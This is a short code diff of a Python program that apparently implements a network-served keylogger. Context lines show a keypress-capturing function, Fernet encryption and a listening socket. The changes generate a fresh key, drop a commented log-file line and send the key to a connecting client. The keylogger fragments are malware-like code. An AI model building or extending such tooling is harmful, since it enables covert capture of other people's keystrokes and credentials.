@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 import ctypes
 
 
-key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
+key = Fernet.generate_key()
 cipher = Fernet(key)
 
 VALID_USERNAME = "test"
@@ -39,7 +39,6 @@ def Decrypt(data):
 def keylogger(keys: int,BUFFER_SIZE):
     buffer = []
     i = 0
-    # with open("keylogs.txt", "a") as log_file:
     def on_press(key):
         nonlocal i
         if i>=keys:
@@ -93,6 +92,7 @@ print("Listening for connections...")
 
 connection, client_address = sock.accept()
 print(f"Connection from {client_address}")
+connection.sendall(key)
 
 
 if authenticate():
